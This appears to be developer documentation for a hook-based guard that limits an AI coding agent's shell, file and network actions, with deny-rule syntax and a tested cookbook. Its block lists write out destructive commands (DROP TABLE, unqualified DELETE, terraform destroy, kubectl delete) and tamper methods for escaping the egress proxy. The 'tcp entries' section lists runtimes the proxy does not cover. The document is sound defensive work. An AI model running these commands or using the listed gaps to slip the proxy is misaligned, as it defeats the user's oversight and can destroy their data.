- **Delivery.** For a Bash or PowerShell command the guard ALLOWS, `guard.exe` prints a PreToolUse `hookSpecificOutput.updatedInput` that holds every original field of the tool input plus `command` = the variables + the original command. It never prints a `permissionDecision`, so the permission mode and the auto classifier still decide. A blocked command keeps the exit-2 behaviour and gets nothing. The `claude` process and the MCP servers never get these variables (they are not in the turn environment, in `--settings` `env` or in an MCP entry): the proxy would cut the Anthropic API.
- **The variables.** `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY` (and the lowercase forms) point at the local proxy port from `.specs/project/loop/internal/network-runtime.json`; `NO_PROXY` keeps the local hosts out; `NODE_USE_ENV_PROXY=1`; `LOOP_NETWORK_ALLOW_FILE` names `network-allow.json` (the effective list and the denies, written by the engine at every turn start); `PYTHONPATH` gets the preload folder in front and `NODE_OPTIONS` gets `--require <preload.cjs>` at the end (an existing value is kept). PowerShell also sets `[System.Net.WebRequest]::DefaultWebProxy` because Windows PowerShell 5.1 cmdlets ignore the proxy variables.
- **`runtime-layer` warn line.** When there is no usable `network-runtime.json` (the proxy did not start), the proxy variables point at a closed local port, so HTTP clients fail closed, and the guard writes a `runtime-layer` line with decision `warn` to `guard.log`: the loop keeps running; look for that line when HTTP calls fail in a loop.
- **Tamper.** Unsetting or replacing any of these variables, `--noproxy`, `-x`, `-NoProxy`, `python -S|-E|-I`, `env -i` and resetting `DefaultWebProxy` are `egress-tamper` blocks; the layer's files (`loop/internal/network-*`) are engine-only (`engine-file-write`).
- **Denials.** The proxy and the preloads write one JSON line per refused connection to `<data dir>/egress.log` (time, project, turn, host, port, method and path when visible, reason). The file is for the user to read (it is rotated past 5 MB); the panel does not list it.
- **`tcp` entries.** A non-HTTP connection (a database, a broker) passes only with an entry `host:port tcp` (`dev-db.example.com:3306 tcp`); the preload refuses it otherwise. An HTTP entry without a port allows 80 and 443 for a direct connection from a preload (the proxy allows any port for it); runtimes that ignore both the variables and the preloads (Java, Go, .NET sockets, `_socket` called directly) are not covered, and Node `dns.resolve*` is not blocked.
- **`network-suggest`.** A marker rule of the `planning` profile (not a block): its presence lets the planning chat write `.specs/project/NETWORK.suggested.json`; every other profile is blocked from that file, and `NETWORK.json` itself is blocked for everyone (the user writes it in the Network section of the panel).

## Fail-open, on purpose

If the guard itself breaks, it lets the call through (exit 0) so a long loop does not stall. This covers an unreadable payload or an exception inside a check, but it is never silent:

- it writes a `guard-failopen` line to `guard.log`;
- it sends a notice through your channels (`harness notify`), at most once an hour.

A `PERMISSIONS.json` that is not valid JSON is ignored: nothing is lifted, and your project rules are not applied either. An invalid regex in `deny_*_regex` is skipped and reported on stderr (`invalid project regex ... skipped`); every other rule, hard rules included, keeps blocking. The broken rule itself does not block until you fix it. Always add rules through `harness rules propose`, which rejects invalid, empty and too-wide patterns. `harness check` re-runs `rules test` before each loop.

## Your rules: `.specs/project/loop/json/PERMISSIONS.json`

The guard finds `.specs/` by walking up from the payload's `cwd` (up to 8 levels). It reads `project/loop/json/PERMISSIONS.json`; a project on the old flat layout still works from `project/PERMISSIONS.json`. Shape:

```json
{
  "deny_bash_regex": ["<regex matched against the whole Bash/PowerShell command>"],
  "deny_path_regex": ["<regex matched against the path of Write/Edit/NotebookEdit and of shell writes>"],
  "allow": [{"rule": "<built-in rule id>", "quote": "<the user's exact words>", "at": "<date>"}]
}
```

- Regexes follow Python `re` syntax and are matched ignoring case (the guard reads them through a compatible engine). In JSON, every backslash is doubled. Write `[\\\\/]` in JSON (`[\\/]` in the regex) to accept both `/` and `\` in paths.
- `deny_bash_regex` sees the whole command text, quotes included. `echo "never run terraform apply"` matches a `terraform apply` rule.
- `deny_path_regex` sees the path written by `Write`/`Edit`/`NotebookEdit` (usually absolute) and the targets of `>`, `tee`, `sed -i`, `Set-Content`... It does not see `cp`, `mv` or a script that writes files. Add a `deny_bash_regex` when that matters.
- SQL sent through a database MCP tool is not a shell command. It is covered by the built-in `dev-write`/`prod-write`, not by `deny_bash_regex`.
- `allow` lifts a built-in rule for this project. The guard only reads `rule` (a plain string also works). `quote` and `at` are the audit trail: write one only with the user's explicit words. Lifting `project-deny` switches off **all** your project rules.

## Cookbook (every example is tested)

This is the full `PERMISSIONS.json` the examples below use. Each must-block and must-pass case below is meant to be run through the real `guard.exe` against exactly this file in a temporary project. A must-block case must exit 2 with `project-deny` as the reason. A must-pass case must exit 0. 

```json
{
  "deny_bash_regex": [
    "\\b(?:DROP\\s+(?:TABLE|DATABASE|SCHEMA)\\b|TRUNCATE\\s+(?:TABLE\\s+)?[\\w.`\"\\[])",
    "\\bDELETE\\s+FROM\\s+[\\w.`\"\\[\\]]+(?![^;\\n]*\\bWHERE\\b)",
    "\\bgit\\b[^\\n;&|]*?\\s(?:checkout|switch)\\s+(?:-[fqmB]\\s+|--\\S+\\s+)*(?:main|master)(?![\\w./-])",
    "\\bterraform\\s+(?:-\\S+\\s+)*(?:apply|destroy)\\b",
    "\\bkubectl\\b[^\\n;&|]*\\sdelete\\b"
  ],
  "deny_path_regex": [
    "(?:^|[\\\\/])migrations[\\\\/]",
    "(?:^|[\\\\/])infra[\\\\/]prod[\\\\/]"
  ],
  "allow": [
    {
      "rule": "install",
      "quote": "yes, you may run npm install in this project",
      "at": "2026-10-15"
    }
  ]
}
```

### 1. Destructive SQL: `DROP TABLE`, `TRUNCATE`, `DELETE FROM` without `WHERE`

```json
"\\b(?:DROP\\s+(?:TABLE|DATABASE|SCHEMA)\\b|TRUNCATE\\s+(?:TABLE\\s+)?[\\w.`\"\\[])",
"\\bDELETE\\s+FROM\\s+[\\w.`\"\\[\\]]+(?![^;\\n]*\\bWHERE\\b)"
```

| Must block | Must pass |
|---|---|
| `psql -c "DROP TABLE users"` | `psql -c "DELETE FROM users WHERE id = 42"` |
| `mysql -e 'truncate table orders'` | `truncate -s 0 app.log` |
| `sqlite3 app.db "TRUNCATE orders"` | `psql -c "SELECT * FROM dropped_tables"` |
| `psql -c "drop database shop"` | `grep -rn "DELETE FROM" src/` |
| `psql -c "DELETE FROM users"` | |
| `mysql -e 'delete from orders;'` | |
| `psql -c "DELETE FROM users; SELECT 1 WHERE true"` (the `WHERE` belongs to another statement) | |

### 2. Never work on `main`

Pushing to `main` (or `master`, or your integration branch) is already blocked by the hard built-in rule `push-protected`, in every profile, with no project rule. A regex cannot see which branch is checked out, so it cannot block "a commit while on `main`" directly. This rule blocks getting onto `main` in the first place. The loop itself always works on its own `loop/<date>` branch in a separate worktree.

```json
"\\bgit\\b[^\\n;&|]*?\\s(?:checkout|switch)\\s+(?:-[fqmB]\\s+|--\\S+\\s+)*(?:main|master)(?![\\w./-])"
```

| Must block | Must pass |
|---|---|
| `git checkout main` | `git checkout -b feature/main-menu` |
| `git switch master` | `git switch -c fix/login main` (new branch from `main`) |
| `git -C repo checkout -B main origin/main` | `git diff main...HEAD` |
| `git checkout main && git commit -m hotfix` | `git log --oneline main` |
| | `git commit -m 'feat: menu'` |

Proven in the `orchestrator` profile. Subagents cannot run write git at all (built-in `git-write`).

### 3. Infrastructure: `terraform apply`, `kubectl delete`

```json
"\\bterraform\\s+(?:-\\S+\\s+)*(?:apply|destroy)\\b",
"\\bkubectl\\b[^\\n;&|]*\\sdelete\\b"
```

| Must block | Must pass |
|---|---|
| `terraform apply -auto-approve` | `terraform plan -out tf.plan` |
| `terraform -chdir=infra destroy` | `terraform validate` |
| `kubectl delete pod api-0` | `kubectl get pods` |
| `kubectl -n prod delete deployment api` | `kubectl describe pod api-0` |

### 4. Protected folders: `migrations/`, `infra/prod/`

```json
"(?:^|[\\\\/])migrations[\\\\/]",
"(?:^|[\\\\/])infra[\\\\/]prod[\\\\/]"
```

| Must block | Must pass |
|---|---|
| Edit `db/migrations/0001_init.sql` | Edit `src/migrations_helper.py` |
| Edit `migrations/0002_users.py` | Edit `docs/migrations.md` |
| Edit `infra/prod/main.tf` | Edit `infra/staging/main.tf` |
| `echo "ALTER TABLE x" > db/migrations/0003.sql` | Edit `infra/production-notes.md` |
| `sed -i s/a/b/ infra/prod/values.yaml` | |

Reading these folders is still allowed. Only writes are blocked.

### 5. Lifting a built-in rule with the user's words

```json
"allow": [{"rule": "install", "quote": "yes, you may run npm install in this project", "at": "2026-10-15"}]
```

With this entry, `npm install left-pad` passes for an executor. Without it, it is blocked by `install`. `allow` never lifts a hard rule: `git push --force origin feature/x` stays blocked even with `"allow": ["push-force", "git-push"]`.

## The `orchestrator-create-block-rule` flow

You rarely edit `PERMISSIONS.json` by hand. Say "never ..." to the orchestrator, and the `orchestrator-create-block-rule` skill turns it into a rule with proof:

1. **Propose and test, writing nothing.** Each example runs through the real guard in the executor profile:
   ```
   harness rules propose <repo> --id R-01 --phrase "never edit migrations" \
     --path '(?:^|[\\/])migrations[\\/]' \
     --block path:db/migrations/0001_init.sql --block path:migrations/0002_users.py \
     --pass path:src/migrations_helper.py --pass path:docs/migrations.md
   ```
   Use `--bash REGEX` with `--block "bash:<command>"` for a command rule. The script rejects an invalid, empty or too-wide regex. Because examples run as an executor, give a git rule pass examples that are read-only git (`git diff main...HEAD`, `git log main`). A write-git example is blocked there by `git-write` anyway.
2. **You approve** what was blocked and what passed.
3. **Write.** Run the same arguments with `write`, plus `--rule "<short text>" --reason "<why>"`. It only writes if the new cases pass and no older rule breaks. It updates `PERMISSIONS.json`, `.specs/project/loop/json/rules.tests.json` (the examples) and a row in `.specs/project/RULES.md`. Only the orchestrator may run `rules write` (`state-script` blocks subagents).
4. **Keep it proven.** `harness rules test <repo>` re-runs every stored example, and `harness check` does it before each loop. `harness rules list <repo>` lists the rules.

## Running the tests

From the repository root:

```
cargo test -p guard-core -p guard
```

The tests run the real guard logic in temporary folders, with `LOOP_DATA_DIR` pointing at an empty folder, so no app, notice or network is touched: the built-in rules, profiles, layout fallbacks and fail-open; the network rules (`egress-host`, `egress-content`, `egress-tamper`, `env-file`) against the shared contract fixture `network_contract.json`, the `updatedInput` delivery and the `egress-upload` exception; line continuations and the other leftovers.

A quick manual check that the guard answers:

```
echo '{"tool_name":"Bash","tool_input":{"command":"git push"}}' | plugin/bin/guard.exe --profile executor; echo $?
```

It must print `2`. `harness doctor` runs the same check.
